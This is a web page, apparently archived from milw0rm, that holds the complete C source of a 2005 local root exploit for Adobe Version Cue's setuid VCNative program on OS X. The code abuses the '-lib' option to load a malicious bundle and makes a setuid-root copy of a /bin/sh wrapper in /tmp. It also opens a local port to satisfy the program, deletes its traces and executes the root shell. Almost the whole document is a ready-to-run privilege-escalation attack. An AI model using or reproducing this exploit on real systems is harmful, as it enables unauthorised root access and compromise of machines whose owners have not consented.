<html>
<head>
<title>Adobe Version Cue 1.0/1.0.1 (-lib) Local Root Exploit (OSX)</title>
<pre>
/*[ Adobe Version Cue VCNative[OSX]: local root exploit. (dyld) ]
* 
* by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo) 
* 
* Adobe Version Cue's VCNative program allows un-privileged 
* local users to load arbitrary libraries(&quot;bundles&quot;) while 
* running setuid root. this is done via the &quot;-lib&quot; 
* command-line option. 
* 
* note: VCNative must connect to a valid host to be able 
* to get to the point where the library is loaded. this is 
* automated in this exploit by listening to an arbitrary local 
* port and using the localhost(&quot;127.0.0.1&quot;) to connect to. 
*****************************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define VCNATIVE_PATH &quot;/Applications/Adobe Version Cue/tomcat/webapps&quot;\
&quot;/ROOT/WEB-INF/components/com.adobe.bauhaus.nativecomm/res/VCNative&quot;
#define VCNATIVE_PORT 7979
#define CC_PATH &quot;/usr/bin/gcc&quot;
#define BUNDLE_PATH &quot;/tmp/xvcn_lib&quot;
#define SUSH_PATH &quot;/tmp/xvcn_sush&quot;

void printe(char *,signed char);

int main(){
signed int sock=0,so=1;
char syscmd[4096+1];
struct stat mod;
struct sockaddr_in sa;
FILE *bundle,*sush;
/* banner. */
printf(&quot;[*] Adobe Version Cue VCNative[OSX]: local root exploit. (dy&quot;
&quot;ld)\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n&quot;);
/* see if we have what we need. */
if(access(CC_PATH,X_OK))
printe(&quot;incorrect gcc/cc path. (CC_PATH)&quot;,1);
if(stat(VCNATIVE_PATH,&amp;mod))
printe(&quot;incorrect VCNative path. (VCNATIVE_PATH)&quot;,1);
if(!(S_ISUID&amp;mod.st_mode))
printe(&quot;VCNative is not setuid. (VCNATIVE_PATH)&quot;,1);
/* appease VCNative's initial connection to load the library. */
sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&amp;so,sizeof(so));
#ifdef SO_REUSEPORT
setsockopt(sock,SOL_SOCKET,SO_REUSEPORT,(void *)&amp;so,sizeof(so));
#endif
sa.sin_family=AF_INET;
sa.sin_port=htons(VCNATIVE_PORT);
sa.sin_addr.s_addr=INADDR_ANY;
printf(&quot;[*] opening local port: %u.\n&quot;,VCNATIVE_PORT);
if(bind(sock,(struct sockaddr *)&amp;sa,sizeof(sa))==-1)
printe(&quot;could not bind socket.&quot;,1);
listen(sock,1); 
/* make the bogus library/bundle. */
if(!(bundle=fopen(BUNDLE_PATH &quot;.c&quot;,&quot;w&quot;)))
printe(&quot;could not write to bundle source file.&quot;,1);
fprintf(bundle,&quot;void VCLibraryInit(){\n&quot;);
fprintf(bundle,&quot; seteuid(0);\n&quot;);
fprintf(bundle,&quot; setuid(0);\n&quot;);
fprintf(bundle,&quot; setegid(0);\n&quot;);
fprintf(bundle,&quot; setgid(0);\n&quot;);
fprintf(bundle,&quot; chown(\&quot;&quot; SUSH_PATH &quot;\&quot;,0,0);\n&quot;);
fprintf(bundle,&quot; chmod(\&quot;&quot; SUSH_PATH &quot;\&quot;,3145);\n&quot;);
fprintf(bundle,&quot;}\n&quot;);
fprintf(bundle,&quot;void VCLibraryExec(){}\n&quot;);
fprintf(bundle,&quot;void VCLibraryExit(){}\n&quot;);
fclose(bundle);
/* make the (to-be) rootshell. */
if(!(sush=fopen(SUSH_PATH &quot;.c&quot;,&quot;w&quot;)))
printe(&quot;could not write to sush/rootshell source file.&quot;,1);
fprintf(sush,&quot;int main(){\n&quot;);
fprintf(sush,&quot; seteuid(0);\n&quot;);
fprintf(sush,&quot; setuid(0);\n&quot;);
fprintf(sush,&quot; setegid(0);\n&quot;);
fprintf(sush,&quot; setgid(0);\n&quot;);
fprintf(sush,&quot; execl(\&quot;/bin/sh\&quot;,\&quot;sh\&quot;,0);\n&quot;);
fprintf(sush,&quot;}\n&quot;);
fclose(sush);
/* compile the bogus library/bundle. */
snprintf(syscmd,4096,&quot;%s %s.c -bundle -o %s.bundle&quot;,CC_PATH,
BUNDLE_PATH,BUNDLE_PATH);
printf(&quot;[*] system: %s\n&quot;,syscmd);
system(syscmd);
/* compile the (to-be) rootshell. */
snprintf(syscmd,4096,&quot;%s %s.c -o %s&quot;,CC_PATH,
SUSH_PATH,SUSH_PATH);
printf(&quot;[*] system: %s\n&quot;,syscmd);
system(syscmd);
/* run VCNative. (&quot;.bundle&quot; is appended to the library path) */
snprintf(syscmd,4096,&quot;\&quot;%s\&quot; -host 127.0.0.1 -port %u -lib %s&quot;,
VCNATIVE_PATH,VCNATIVE_PORT,BUNDLE_PATH);
printf(&quot;[*] system: %s\n&quot;,syscmd);
system(syscmd);
/* clean-up. */
unlink(BUNDLE_PATH &quot;.c&quot;);
unlink(BUNDLE_PATH &quot;.bundle&quot;);
unlink(SUSH_PATH &quot;.c&quot;);
shutdown(sock,2);
close(sock);
/* check for success. */
if(stat(SUSH_PATH,&amp;mod))
printe(&quot;sush/rootshell vanished? (SUSH_PATH)&quot;,1);
if(!(S_ISUID&amp;mod.st_mode)||mod.st_uid){
unlink(SUSH_PATH);
printe(&quot;sush/rootshell is not setuid root, exploit failed.&quot;,1);
}
/* success. */
printf(&quot;[*] attempting to execute rootshell... (&quot; SUSH_PATH &quot;)\n\n&quot;);
system(SUSH_PATH);
exit(0);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
printf(&quot;[!] %s\n&quot;,err);
if(e)exit(e);
return;
}

// milw0rm.com [2005-08-30]
</pre>
</html>

